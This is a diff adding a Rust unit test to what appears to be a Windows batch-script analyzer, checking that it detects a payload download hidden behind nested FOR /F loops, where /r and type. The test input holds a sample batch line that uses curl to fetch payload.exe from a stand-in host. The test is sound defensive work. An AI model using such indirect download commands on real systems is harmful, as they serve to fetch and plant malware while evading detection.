@@ -3870,6 +3870,28 @@ for /f "tokens=* delims=" %%F in ('findstr /m /c:"https://" *.txt') do for /f "t
     }
 
     #[test]
+    fn for_f_where_recursive_wildcard_discovers_generated_file_source() {
+        let report = analyze(
+            br#"echo https://for-f-where-recursive-wildcard.example/payload.exe>C:\Work\Sub\url.txt
+for /f "tokens=* delims=" %%F in ('where /r C:\Work *.txt') do for /f "tokens=* delims=" %%U in ('type %%F') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-where-recursive-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F where /r wildcard source did not discover generated file for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_cmd_c_type_reads_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-cmd-c-type.example/payload.exe>url.txt
